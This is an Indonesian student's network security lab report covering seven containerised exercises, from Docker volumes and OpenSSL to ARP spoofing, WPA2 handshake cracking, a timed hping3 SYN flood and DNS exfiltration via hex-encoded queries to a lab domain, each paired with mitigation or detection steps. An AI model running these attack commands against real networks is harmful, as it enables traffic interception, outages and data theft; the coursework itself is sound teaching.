# LAPORAN UTS NETWORK SECURITY
## Kasus 5 (K5) — Dokumentasi Tugas 1–7

**Nama:** Putra Baadi Zaelani  
**NIM:** 24552011131  
**Program Studi:** Teknik Informatika  
**Mata Kuliah:** Network Security  

---

# Parameter Praktikum

| Parameter | Nilai |
|---|---|
| Container target | `target-k5` |
| Volume | `vol-k5` |
| File | `laporan-k5.txt` |
| Kata sandi enkripsi | `kunci-k5-2026` |
| Domain DNS | `k5.exfil.lab` |

**Catatan:** Semua pengujian dilakukan pada lingkungan lab yang disediakan untuk praktikum. Placeholder `NIM-ANDA` diganti dengan NIM mahasiswa.

---

# TUGAS 1 — DOCKER DAN VOLUME
## Pertemuan 1

### 1. Tujuan
Memahami penggunaan Docker Volume untuk menyimpan data secara persisten, sehingga data tidak hilang ketika container dihapus. Selain itu, menguji komunikasi antarcontainer menggunakan Docker Compose.

### 2. Perintah dan penjelasan

**A. Membuat Docker Volume**

```bash
docker volume create vol-k5
```

Penjelasan:
- `docker volume create` digunakan untuk membuat penyimpanan permanen.
- `vol-k5` merupakan nama volume yang digunakan dalam praktikum.
- Volume digunakan agar data dapat bertahan meskipun container dihapus.

**B. Menyimpan NIM ke dalam volume**

```bash
docker run --name w-k5 -v vol-k5:/data alpine sh -c 'echo NIM-ANDA > /data/laporan-k5.txt'
```

Penjelasan:
- `docker run` menjalankan container baru.
- `--name w-k5` memberikan nama container.
- `-v vol-k5:/data` menghubungkan volume ke direktori `/data`.
- `alpine` merupakan image Linux berukuran ringan.
- `echo NIM-ANDA` menuliskan NIM ke dalam file.
- `>` menyimpan hasil tulisan ke `laporan-k5.txt`.

**C. Menghapus container pertama**

```bash
docker rm w-k5
```

Penjelasan:
- `docker rm` menghapus container yang sudah berhenti.
- Penghapusan ini digunakan untuk membuktikan bahwa data tetap tersimpan di volume.

**D. Membaca data dari container baru**

```bash
docker run --rm -v vol-k5:/data alpine cat /data/laporan-k5.txt
```

Penjelasan:
- `--rm` menghapus container secara otomatis setelah perintah selesai.
- Volume `vol-k5` dipasang kembali pada `/data`.
- `cat` digunakan untuk membaca isi file.
- Jika NIM masih tampil, berarti data berhasil dipertahankan meskipun container sebelumnya sudah dihapus.

**E. Menjalankan Docker Compose**

```bash
docker compose -p k5 -f b/b1-compose/docker-compose.yml up -d
```

Penjelasan:
- `docker compose` menjalankan layanan berdasarkan konfigurasi YAML.
- `-p k5` memberikan nama proyek `k5`.
- `-f` menentukan lokasi file konfigurasi.
- `up -d` menjalankan container di latar belakang.

**F. Menguji komunikasi attacker ke target**

```bash
docker compose -p k5 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
```

Penjelasan:
- `exec attacker` menjalankan perintah dari container attacker.
- `wget` digunakan untuk mengakses layanan web.
- `http://target` merupakan alamat container target berdasarkan nama layanan.
- `-qO-` menampilkan isi halaman tanpa pesan tambahan.
- Halaman Welcome to nginx menunjukkan komunikasi antarcontainer berhasil.

**G. Menghentikan dan membersihkan lab**

```bash
docker compose -p k5 -f b/b1-compose/docker-compose.yml down -v
```

Penjelasan:
- `down` menghentikan dan menghapus container serta network proyek.
- `-v` turut menghapus volume yang dikelola oleh Compose.
- Perintah ini digunakan untuk membersihkan lingkungan praktikum.

### 3. Bukti Praktikum

**Screenshot 1:** Pembuatan volume dan penyimpanan NIM.

[Tempel screenshot di sini]

**Screenshot 2:** Pembacaan file dari container baru setelah container pertama dihapus.

[Tempel screenshot di sini]

**Screenshot 3:** Hasil akses halaman Nginx dari container attacker.

[Tempel screenshot di sini]

### 4. Kesimpulan

Docker Volume memungkinkan data tetap tersimpan meskipun container dihapus. Docker Compose juga mempermudah pengelolaan beberapa container dan memungkinkan komunikasi antarcontainer melalui jaringan yang telah dikonfigurasi.

---

# TUGAS 2 — KRIPTOGRAFI
## Pertemuan 2

### 1. Tujuan
Memahami proses enkripsi dan dekripsi menggunakan algoritma AES-256-CBC, membandingkan hash SHA-256, serta membuat sertifikat digital menggunakan RSA dan X.509.

### 2. Perintah dan penjelasan

**A. Enkripsi dan dekripsi file**

```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k5 > laporan-k5.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k5.txt -out laporan-k5.enc -pass pass:kunci-k5-2026 && sha256sum laporan-k5.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k5.enc -out hasil-k5.txt -pass pass:kunci-k5-2026 && sha256sum hasil-k5.txt'
```

Penjelasan:
- `docker run --rm` menjalankan container sementara.
- `-v "$PWD":/work` menghubungkan direktori kerja ke container.
- `uts-openssl` merupakan image yang menyediakan OpenSSL.
- `echo` membuat isi awal file laporan.
- `openssl enc` digunakan untuk melakukan enkripsi.
- `-aes-256-cbc` menentukan algoritma AES dengan kunci 256-bit dan mode CBC.
- `-pbkdf2` menggunakan mekanisme derivasi kunci PBKDF2.
- `-salt` menambahkan salt pada proses derivasi kunci.
- `-in` menentukan file masukan.
- `-out` menentukan file hasil enkripsi.
- `-pass` memberikan kata sandi praktikum.
- `openssl enc -d` melakukan proses dekripsi.
- `sha256sum` menghitung hash SHA-256 untuk membandingkan file asli dan hasil dekripsi.
- Jika kedua hash sama, isi file hasil dekripsi sesuai dengan file aslinya.

**B. Membuat sertifikat digital**

```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k5.pem -out cert-k5.pem -days 30 -subj /CN=k5.uts.local && openssl x509 -in cert-k5.pem -noout -subject -issuer -dates'
```

Penjelasan:
- `openssl req` digunakan untuk membuat permintaan atau sertifikat.
- `-x509` menghasilkan sertifikat X.509 yang ditandatangani sendiri.
- `-newkey rsa:2048` membuat pasangan kunci RSA 2048-bit.
- `-nodes` membuat private key tanpa enkripsi kata sandi.
- `-keyout` menentukan lokasi penyimpanan private key.
- `-out` menentukan lokasi penyimpanan sertifikat.
- `-days 30` menentukan masa berlaku sertifikat selama 30 hari.
- `-subj /CN=k5.uts.local` menentukan Common Name sertifikat.
- `openssl x509` digunakan untuk membaca informasi sertifikat.
- `-noout` menampilkan informasi tanpa mencetak isi sertifikat.
- `-subject`, `-issuer`, dan `-dates` menampilkan identitas penerbit serta masa berlaku sertifikat.

### 3. Bukti Praktikum

**Screenshot 1:** Proses enkripsi, dekripsi, dan hasil hash SHA-256.

[Tempel screenshot di sini]

**Screenshot 2:** Subject, Issuer, dan masa berlaku sertifikat.

[Tempel screenshot di sini]

### 4. Hasil Pengujian

Hash file asli: [Isi hasil SHA-256]

Hash file hasil dekripsi: [Isi hasil SHA-256]

Subject: [Isi hasil]

Issuer: [Isi hasil]

### 5. Kesimpulan

AES-256-CBC digunakan untuk melindungi kerahasiaan file melalui enkripsi. Hash SHA-256 dapat digunakan untuk memeriksa kesamaan isi file setelah dekripsi. Sertifikat X.509 digunakan untuk mengidentifikasi entitas melalui informasi sertifikat digital.

---

# TUGAS 3 — ARP SPOOFING
## Pertemuan 3

### 1. Tujuan
Memahami cara kerja protokol ARP, mempelajari simulasi ARP spoofing dalam jaringan lab terisolasi, dan mengetahui mitigasi menggunakan static ARP.

### 2. Perintah dan penjelasan

**A. Membuat jaringan lab**

```bash
docker network create lab-arp-k5
```

Penjelasan:
- `docker network create` membuat jaringan baru.
- `lab-arp-k5` merupakan nama jaringan khusus praktikum.
- Jaringan ini digunakan sebagai lingkungan komunikasi antarcontainer.

**B. Menjalankan container korban**

```bash
docker run -d --name korban-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
```

Penjelasan:
- `-d` menjalankan container di latar belakang.
- `--name korban-k5` memberikan nama container korban.
- `--network lab-arp-k5` menghubungkan container ke jaringan lab.
- `--cap-add NET_ADMIN` memberikan kemampuan administrasi jaringan yang diperlukan untuk praktikum.
- `uts-kali-tools` merupakan image yang menyediakan alat pengujian jaringan.

**C. Menjalankan container gateway**

```bash
docker run -d --name gateway-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
```

Penjelasan:
- Membuat container yang berperan sebagai gateway simulasi.
- Container ditempatkan pada jaringan yang sama dengan korban.
- Kemampuan `NET_ADMIN` digunakan untuk keperluan pengaturan jaringan.

**D. Menjalankan container penyerang**

```bash
docker run -d --name penyerang-k5 --network lab-arp-k5 --cap-add NET_ADMIN uts-kali-tools
```

Penjelasan:
- Membuat container untuk melakukan simulasi ARP spoofing.
- Container berada di jaringan lab yang sama.
- Pengujian dibatasi pada container praktikum.

**E. Memeriksa alamat IP container**

```bash
docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k5.IPAddress}}' korban-k5 gateway-k5
```

Penjelasan:
- `docker inspect` digunakan untuk membaca informasi container.
- Format `-f` memilih informasi tertentu menggunakan template.
- `IPAddress` menampilkan alamat IP container.
- Informasi ini diperlukan untuk mengetahui alamat korban dan gateway.

**F. Melihat tabel ARP korban**

```bash
docker exec korban-k5 arp -a
```

Penjelasan:
- `docker exec` menjalankan perintah di dalam container.
- `arp -a` menampilkan tabel ARP.
- Tabel tersebut berisi pemetaan alamat IP ke alamat MAC.

**G. Melakukan simulasi ARP spoofing**

```bash
docker exec -d penyerang-k5 timeout 20 arpspoof -i eth0 -t <ip-korban> <ip-gateway>
```

Penjelasan:
- Perintah dijalankan dari container penyerang.
- `timeout 20` membatasi durasi pengujian selama 20 detik.
- `arpspoof` merupakan alat untuk simulasi pemalsuan pesan ARP.
- `-i eth0` menentukan interface jaringan.
- `-t` menentukan alamat IP korban.
- Alamat IP gateway menjadi target pemalsuan pemetaan ARP.
- Pengujian hanya dilakukan pada jaringan lab yang dibuat.

**H. Memeriksa perubahan tabel ARP**

```bash
docker exec korban-k5 arp -a
```

Penjelasan:
- Memeriksa kembali tabel ARP setelah simulasi.
- Perubahan alamat MAC pada entri gateway dapat menunjukkan dampak simulasi ARP spoofing.

**I. Menerapkan static ARP**

```bash
docker exec korban-k5 arp -s <ip-gateway> <mac-gateway>
```

Penjelasan:
- `arp -s` digunakan untuk menambahkan pemetaan IP dan MAC secara statis.
- `<ip-gateway>` diganti dengan IP gateway.
- `<mac-gateway>` diganti dengan MAC asli gateway.
- Static ARP membantu mencegah perubahan pemetaan secara dinamis pada entri tersebut.

**J. Memeriksa hasil mitigasi**

```bash
docker exec korban-k5 arp -a
```

Penjelasan:
- Memeriksa kembali tabel ARP setelah mitigasi.
- Entri gateway diharapkan menggunakan alamat MAC asli yang telah ditentukan.

### 3. Bukti Praktikum

**Screenshot 1:** Pembuatan jaringan dan tiga container.

[Tempel screenshot di sini]

**Screenshot 2:** Tabel ARP sebelum simulasi.

[Tempel screenshot di sini]

**Screenshot 3:** Tabel ARP setelah simulasi ARP spoofing.

[Tempel screenshot di sini]

**Screenshot 4:** Tabel ARP setelah penerapan mitigasi static ARP.

[Tempel screenshot di sini]

### 4. Kesimpulan

ARP spoofing merupakan teknik manipulasi pemetaan alamat IP dan MAC pada jaringan lokal. Static ARP dapat digunakan sebagai salah satu langkah mitigasi dengan menetapkan pemetaan IP dan MAC secara manual.

---

# TUGAS 4 — ANALISIS HANDSHAKE WPA2
## Pertemuan 4

### 1. Tujuan
Memahami proses autentikasi WPA2 dan menganalisis file capture handshake menggunakan Aircrack-ng serta wordlist yang telah disediakan penguji.

### 2. Perintah dan penjelasan

```bash
docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k5.txt handshake-k5.cap
```

Penjelasan:
- `docker run --rm` menjalankan container sementara.
- `-v "$PWD":/work` menghubungkan direktori kerja ke container.
- `uts-kali-tools` merupakan image yang menyediakan Aircrack-ng.
- `aircrack-ng` digunakan untuk menganalisis capture WPA/WPA2.
- `-w wordlist-k5.txt` menentukan file daftar kata sandi yang digunakan untuk pengujian.
- `handshake-k5.cap` merupakan file capture yang dianalisis.
- Hasil pengujian dapat menunjukkan kata sandi ditemukan atau `KEY NOT FOUND`.

### 3. Penjelasan Four-Way Handshake

WPA2 menggunakan proses Four-Way Handshake untuk membentuk dan memastikan kunci komunikasi antara access point dan client.

1. **Message 1:** Access Point mengirimkan ANonce kepada client.
2. **Message 2:** Client mengirimkan SNonce dan MIC sebagai bagian dari proses autentikasi.
3. **Message 3:** Access Point mengirimkan informasi pengamanan dan konfirmasi kepada client.
4. **Message 4:** Client mengirimkan konfirmasi bahwa proses handshake berhasil.

Proses ini memastikan kedua pihak memiliki material kunci yang sesuai sebelum komunikasi berlangsung.

### 4. Bukti Praktikum

**Screenshot 1:** Perintah Aircrack-ng dan proses analisis handshake.

[Tempel screenshot di sini]

**Screenshot 2:** Hasil akhir pengujian, baik kata sandi ditemukan maupun `KEY NOT FOUND`.

[Tempel screenshot di sini]

### 5. Hasil Pengujian

Status hasil: [Isi sesuai output aktual]

Analisis: [Jelaskan apakah wordlist berhasil menemukan kata sandi atau tidak.]

### 6. Kesimpulan

Analisis handshake WPA2 membantu memahami proses autentikasi jaringan Wi-Fi. Aircrack-ng dapat digunakan untuk menguji kecocokan kandidat kata sandi dari wordlist terhadap data handshake yang tersedia.

---

# TUGAS 5 — ICMP DENGAN SCAPY
## Pertemuan 5

### 1. Tujuan
Memahami protokol ICMP dan menggunakan Scapy untuk mengirim paket ICMP serta mengamati respons dari host tujuan.

### 2. Perintah dan penjelasan

```bash
docker run --rm --network lab-arp-k5 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-korban>
```

Penjelasan:
- `docker run --rm` menjalankan container sementara.
- `--network lab-arp-k5` menghubungkan container ke jaringan lab.
- `-v "$PWD/kasus/k5-scapy:/work"` menghubungkan folder script ke dalam container.
- `uts-kali-tools` merupakan image yang menyediakan Python dan Scapy.
- `python3` menjalankan script Python.
- `/work/kirim_icmp.py` merupakan file program yang digunakan untuk mengirim paket ICMP.
- `<ip-korban>` diganti dengan alamat IP container tujuan.

### 3. Penjelasan Hasil

Beberapa informasi yang diamati:

- **TTL (Time To Live):** Menunjukkan batas waktu hidup paket IP dalam satuan hop.
- **ICMP Type:** Menunjukkan jenis pesan ICMP.
- **Type 8:** Echo Request.
- **Type 0:** Echo Reply.

Jika program menerima balasan dengan Type 0, berarti host tujuan memberikan respons ICMP Echo Reply.

### 4. Penjelasan Smurf Attack

Smurf Attack merupakan salah satu jenis serangan DoS yang memanfaatkan ICMP Echo Request dan alamat broadcast. Dalam serangan ini, alamat IP korban dapat dipalsukan sebagai sumber paket sehingga banyak host mengirimkan balasan ke korban.

Mitigasi dapat dilakukan dengan membatasi atau menonaktifkan respons ICMP broadcast dan menerapkan penyaringan paket pada jaringan.

### 5. Bukti Praktikum

**Screenshot 1:** Perintah menjalankan script Scapy.

[Tempel screenshot di sini]

**Screenshot 2:** Hasil TTL dan tipe ICMP balasan.

[Tempel screenshot di sini]

### 6. Hasil Pengujian

TTL balasan: [Isi hasil aktual]

Tipe ICMP balasan: [Isi hasil aktual]

Analisis: [Jelaskan hasil komunikasi ICMP.]

### 7. Kesimpulan

Scapy dapat digunakan untuk membuat dan mengirim paket jaringan secara terprogram. Melalui pengujian ini, mahasiswa dapat memahami proses ICMP Echo Request dan Echo Reply serta mengenali potensi penyalahgunaan ICMP pada Smurf Attack.

---

# TUGAS 6 — SYN FLOOD DAN THREE-WAY HANDSHAKE
## Pertemuan 6

### 1. Tujuan
Memahami proses TCP Three-Way Handshake dan mengetahui dampak SYN Flood terhadap ketersediaan layanan jaringan melalui simulasi terbatas di lingkungan lab.

### 2. Perintah dan penjelasan

**A. Menjalankan lab**

```bash
docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml up -d
```

Penjelasan:
- Menjalankan layanan target dan attacker berdasarkan konfigurasi Docker Compose.
- `-p k5` memberikan nama proyek.
- `up -d` menjalankan layanan di latar belakang.

**B. Memeriksa koneksi SYN_RECV sebelum pengujian**

```bash
docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
```

Penjelasan:
- `exec target` menjalankan perintah di container target.
- `netstat -ant` menampilkan koneksi TCP.
- `grep -c SYN_RECV` menghitung jumlah koneksi dengan status SYN_RECV.
- Hasil ini menjadi kondisi awal sebelum simulasi.

**C. Simulasi SYN Flood terbatas**

```bash
docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
```

Penjelasan:
- Perintah dijalankan dari container attacker pada jaringan lab.
- `timeout 15` membatasi pengujian selama 15 detik.
- `hping3` merupakan alat untuk pengujian paket jaringan.
- `-S` mengatur flag SYN pada paket TCP.
- `-p 80` menentukan port tujuan 80.
- `--flood` mengirimkan paket secara cepat untuk simulasi beban koneksi.
- Pengujian dibatasi hanya pada target lab.

**D. Memeriksa SYN_RECV selama pengujian**

```bash
docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
```

Penjelasan:
- Menghitung kembali koneksi dengan status SYN_RECV.
- Hasilnya dibandingkan dengan kondisi awal.
- Peningkatan jumlah koneksi dapat menunjukkan adanya penumpukan permintaan koneksi TCP.

**E. Mengamati paket TCP**

```bash
docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
```

Penjelasan:
- `tcpdump` digunakan untuk menangkap dan mengamati paket jaringan.
- `-i eth0` menentukan interface yang diamati.
- `-nn` menampilkan alamat IP dan port tanpa menerjemahkan nama.
- `tcp port 80` membatasi pengamatan pada lalu lintas TCP port 80.
- `timeout 10` membatasi durasi pengamatan.
- `curl` mengirim permintaan HTTP ke target.
- Output curl diarahkan ke `/dev/null` agar tidak menampilkan isi halaman.

**F. Membersihkan lab**

```bash
docker compose -p k5 -f b/b3-syn-flood/docker-compose.yml down -v
```

Penjelasan:
- Menghentikan dan menghapus container serta network yang dikelola oleh proyek Compose.
- `-v` menghapus volume yang dikelola oleh proyek tersebut.

### 3. Penjelasan TCP Three-Way Handshake

TCP menggunakan tiga tahapan utama untuk membangun koneksi:

1. **SYN:** Client meminta untuk memulai koneksi ke server.
2. **SYN-ACK:** Server memberikan respons bahwa permintaan diterima.
3. **ACK:** Client mengirimkan konfirmasi terakhir.

Setelah tiga tahap tersebut selesai, koneksi TCP dapat digunakan untuk pertukaran data.

### 4. Bukti Praktikum

**Screenshot 1:** Jumlah SYN_RECV sebelum simulasi.

[Tempel screenshot di sini]

**Screenshot 2:** Simulasi SYN Flood terbatas dan jumlah SYN_RECV saat pengujian.

[Tempel screenshot di sini]

**Screenshot 3:** Hasil tcpdump yang menunjukkan proses TCP.

[Tempel screenshot di sini]

### 5. Hasil Pengujian

Jumlah SYN_RECV sebelum pengujian: [Isi hasil]

Jumlah SYN_RECV selama pengujian: [Isi hasil]

Analisis paket: [Jelaskan paket SYN, SYN-ACK, dan ACK yang terlihat.]

### 6. Kesimpulan

TCP Three-Way Handshake merupakan mekanisme pembentukan koneksi TCP. SYN Flood memanfaatkan banyak permintaan SYN sehingga dapat membebani sumber daya server. Pemantauan koneksi TCP membantu administrator mengetahui adanya aktivitas koneksi yang tidak normal.

---

# TUGAS 7 — DNS EXFILTRATION
## Pertemuan 7

### 1. Tujuan
Memahami bagaimana DNS dapat disalahgunakan sebagai media pengiriman data keluar jaringan, serta mempelajari cara mendeteksi dan membaca data yang dikodekan dalam query DNS.

### 2. Perintah dan penjelasan

**A. Menjalankan lab DNS**

```bash
docker compose -p k5 -f b/b4-dns-exfil/docker-compose.yml up -d
```

Penjelasan:
- Menjalankan layanan DNS dan attacker sesuai konfigurasi Compose.
- `-p k5` memberikan nama proyek.
- `up -d` menjalankan layanan di latar belakang.

**B. Mengubah NIM menjadi format hexadecimal**

```bash
echo -n NIM-ANDA | xxd -p
```

Penjelasan:
- `echo -n` menampilkan teks tanpa menambahkan karakter newline.
- `NIM-ANDA` diganti dengan NIM mahasiswa.
- `xxd -p` mengubah data teks menjadi representasi hexadecimal.
- Hasil hexadecimal dapat digunakan sebagai label dalam query DNS.

**C. Mengirim query DNS**

```bash
docker compose -p k5 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short <hex>.k5.exfil.lab @dns
```

Penjelasan:
- `exec attacker` menjalankan perintah dari container attacker.
- `dig` digunakan untuk melakukan permintaan DNS.
- `+short` menampilkan jawaban DNS secara ringkas.
- `<hex>` diganti dengan hasil konversi hexadecimal sebelumnya.
- `k5.exfil.lab` merupakan domain praktikum.
- `@dns` menentukan server DNS yang digunakan.

**D. Menyimpan log DNS**

```bash
docker compose -p k5 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k5.log
```

Penjelasan:
- `logs dns` menampilkan log dari layanan DNS.
- `>` mengarahkan output ke file.
- `dns-k5.log` digunakan untuk menyimpan catatan query DNS yang terjadi selama pengujian.

**E. Menganalisis log DNS**

```bash
python3 kasus/k5-dns-exfil/analisis_dns.py dns-k5.log
```

Penjelasan:
- `python3` menjalankan program Python.
- `kasus/k5-dns-exfil/analisis_dns.py` merupakan script analisis DNS.
- `dns-k5.log` menjadi file masukan.
- Script digunakan untuk mendeteksi pola query DNS yang mencurigakan sesuai aturan yang dibuat.

**F. Mengembalikan hexadecimal menjadi teks**

```bash
echo <hex> | xxd -r -p
```

Penjelasan:
- `echo` menampilkan data hexadecimal.
- `xxd -r -p` mengubah data hexadecimal kembali menjadi teks.
- Hasilnya seharusnya sama dengan NIM yang sebelumnya dikodekan.

**G. Membersihkan lab**

```bash
docker compose -p k5 -f b/b4-dns-exfil/docker-compose.yml down -v
```

Penjelasan:
- Menghentikan dan menghapus container serta network proyek.
- `-v` menghapus volume yang dikelola oleh Compose.

### 3. Bukti Praktikum

**Screenshot 1:** Hasil konversi NIM ke hexadecimal.

[Tempel screenshot di sini]

**Screenshot 2:** Query DNS menggunakan domain praktikum.

[Tempel screenshot di sini]

**Screenshot 3:** Log DNS yang berhasil disimpan.

[Tempel screenshot di sini]

**Screenshot 4:** Hasil analisis DNS dan proses decoding hexadecimal.

[Tempel screenshot di sini]

### 4. Hasil Pengujian

Hasil hexadecimal: [Isi hasil]

Query DNS: [Isi hasil]

Hasil deteksi: [Isi hasil]

Hasil decoding: [Isi hasil]

### 5. Kesimpulan

DNS Exfiltration merupakan teknik penyalahgunaan protokol DNS untuk mengirimkan data melalui query DNS. Analisis log DNS dapat membantu mendeteksi pola query yang tidak biasa, sedangkan konversi hexadecimal memungkinkan data yang dikirimkan dibaca kembali.

---

# KESIMPULAN AKHIR

Berdasarkan praktikum Kasus 5, terdapat tujuh materi keamanan jaringan yang telah dipelajari, yaitu Docker dan Volume, Kriptografi, ARP Spoofing, Analisis Handshake WPA2, ICMP dengan Scapy, SYN Flood, dan DNS Exfiltration.

Setiap praktikum memberikan pemahaman mengenai cara kerja teknologi jaringan, potensi kerentanan, serta metode pengujian dan mitigasi dalam lingkungan laboratorium.

Dokumentasi ini dilengkapi dengan perintah praktikum, penjelasan fungsi setiap perintah, hasil pengujian, dan bukti screenshot sebagai pendukung laporan.
